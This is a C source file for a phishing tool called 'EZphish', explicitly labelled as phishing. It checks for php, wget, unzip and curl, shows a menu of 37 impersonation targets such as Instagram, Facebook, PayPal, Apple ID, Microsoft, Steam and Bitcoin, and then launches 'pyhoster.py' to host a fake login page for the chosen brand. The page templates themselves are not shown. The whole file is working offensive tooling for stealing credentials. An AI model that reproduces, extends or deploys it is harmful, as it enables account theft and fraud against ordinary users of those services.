//H4D0cKz offical:phishing
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
char*json = "VAL.json";
#include <signal.h>
char*server;
int option;
char *name ="EZphish";
void menu() {
    printf("\033[34m"); // Set color to blue
    printf("      /`·.¸\n");
    printf("     /¸...¸`:·\n");
    printf(" ¸.·´  ¸   `·.¸.·´)\n");
    printf(": © ):´;      ¸  {\n");
    printf(" `·.¸ `·  ¸.·´\\`·¸)\n");
    printf(" .--. .----.      .-.    _       .-.\n");
    printf(": .--'`--. :      : :   :_;      : :\n");
    printf(": `;    ,','.---. : `-. .-. .--. : `-.\n");
    printf(": :__ .'.'_ : .; `: .. :: :`._-.': .. :\n");
    printf("`.__.':____;: ._.':_;:_;:_;`.__.':_;:_;");
    printf("            : :\n");
    printf("\033[0m"); // Reset color
    printf("\n---------------------------------------------------------------\n");
    printf("          [01] \033[38;5;175mInstagram\033[0m      [17] \033[38;5;52mDropBox\033[0m        [33] \033[38;5;202meBay\033[0m               \n");
    printf("          [02] \033[38;5;24mFacebook\033[0m       [18] \033[38;5;221mAdobe ID\033[0m       [34] \033[38;5;236mAmazon\033[0m             \n");
    printf("          [03] \033[38;5;227mSnapchat\033[0m       [19] \033[38;5;81mShopify\033[0m        [35] \033[38;5;117miCloud\033[0m             \n");
    printf("          [04] \033[38;5;39mTwitter\033[0m        [20] \033[38;5;14mMessenger\033[0m      [36] \033[38;5;28mSpotify\033[0m            \n");
    printf("          [05] \033[38;5;250mGithub\033[0m         [21] \033[38;5;102mGitLab\033[0m         [37] \033[38;5;209mNetflix\033[0m            \n");
    printf("          [06] \033[38;5;196mGoogle\033[0m         [22] \033[38;5;93mTwitch\033[0m                 \n");
    printf("          [07] \033[38;5;166mOrigin\033[0m         [23] \033[38;5;170mMySpace\033[0m                                \n");
    printf("          [08] \033[38;5;11mYahoo\033[0m          [24] \033[38;5;9mBadoo\033[0m                                  \n");
    printf("          [09] \033[38;5;27mLinkedin\033[0m       [25] \033[38;5;57mVK\033[0m                                     \n");
    printf("          [10] \033[38;5;47mProtonmail\033[0m     [26] \033[38;5;11mYandex\033[0m                                 \n");
    printf("          [11] \033[38;5;18mWordpress\033[0m      [27] \033[38;5;162mdevianART\033[0m                              \n");
    printf("          [12] \033[38;5;21mMicrosoft\033[0m      [28] \033[38;5;231mWi-Fi\033[0m                                  \n");
    printf("          [13] \033[38;5;89mIGFollowers\033[0m    [29] \033[38;5;208mPayPal\033[0m                                 \n");
    printf("          [14] \033[38;5;124mPinterest\033[0m      [30] \033[38;5;12mSteam\033[0m                                  \n");
    printf("          [15] \033[38;5;161mApple ID\033[0m       [31] \033[38;5;226mBitcoin\033[0m                                \n");
    printf("          [16] \033[38;5;196mVerizon\033[0m        [32] \033[38;5;54mPlaystation\033[0m\n");
    printf("---------------------------------------------------------------\n");
}

int main() {
    if (system("command -v php > /dev/null 2>&1") != 0) {
        fprintf(stderr, "\033[31mMissing \033[0m\033[37mphp\033[0m\033[31m !Please Install!\033[0m\n");
        if (system("false") == 0) {
            return 1;
        } else {
            return 1;
        }
    }
    if (system("command -v wget > /dev/null 2>&1") != 0) {
        fprintf(stderr, "\033[31mMissing \033[0m\033[37mwget\033[0m\033[31m !Please Install!\033[0m\n");
        if (system("false") == 0) {
            return 1;
        } else {
            return 1;
        }
    }
    if (system("command -v unzip > /dev/null 2>&1") != 0) {
        fprintf(stderr, "\033[31mMissing \033[0m\033[37munzip\033[0m\033[31m !Please Install!\033[0m\n");
        if (system("false") == 0) {
            return 1;
        } else {
            return 1;
        }
    }
    if (system("command -v curl > /dev/null 2>&1") != 0) {
        fprintf(stderr, "\033[31mMissing \033[0m\033[37mcurl\033[0m\033[31m !Please Install!\033[0m\n");
        if (system("false") == 0) {
            return 1;
        } else {
            return 1;
        }
    }
    menu();
    while (1) {
        printf("> ");
        if (scanf("%d", &option) != 1) {
            printf("\033[1;33m!Invalid input!\033[0m\n");
            while (getchar() != '\n');  // Clear input buffer
            continue;
        }

        switch (option) {
            case 0:
                server= "testing";
                break;
            case 1:
                server = "instagram";
                break;
            case 2:
                server = "facebook";
                break;
            case 3:
                server = "snapchat";
                break;
            case 4:
                server = "twitter";
                break;
            case 5:
                server = "github";
                break;
            case 6:
                server = "google";
                break;
            case 7:
                server = "origin";
                break;
            case 8:
                server = "yahoo";
                break;
            case 9:
                server = "linkedin";
                break;
            case 10:
                server = "protonmail";
                break;
            case 11:
                server = "wordpress";
                break;
            case 12:
                server = "microsoft";
                break;
            case 13:
                server = "instafollowers";
                break;
            case 14:
                server = "pinterest";
                break;
            case 15:
                server = "apple";
                break;
            case 16:
                server = "verizon";
                break;
            case 17:
                server = "dropbox";
                break;
            case 18:
                server = "adobe";
                break;
            case 19:
                server = "shopify";
                break;
            case 20:
                server = "messenger";
                break;
            case 21:
                server = "gitlab";
                break;
            case 22:
                server = "twitch";
                break;
            case 23:
                server = "myspace";
                break;
            case 24:
                server = "badoo";
                break;
            case 25:
                server = "vk";
                break;
            case 26:
                server = "yandex";
                break;
            case 27:
                server = "devianart";
                break;
            case 28:
                server = "wifi";
                break;
            case 29:
                server = "paypal";
                break;
            case 30:
                server = "steam";
                break;
            case 31:
                server = "bitcoin";
                break;
            case 32:
                server = "playstation";
                break;
            case 33:
                server = "ebay";
                break;
            case 34:
                server = "amazon";
                break;
            case 35:
                server = "icloud";
                break;
            case 36:
                server = "spotify";
                break;
            case 37:
                server = "netflix";
                break;
            default:
                printf("\033[1;33m!Invalid input!\033[0m\n");
                continue;
        }
        break;
    }
    printf("Selected server:%s\n", server);
    char command[100];
    snprintf(command, sizeof(command), "python pyhoster.py --site %s", server);
    system(command);
    return 0;
}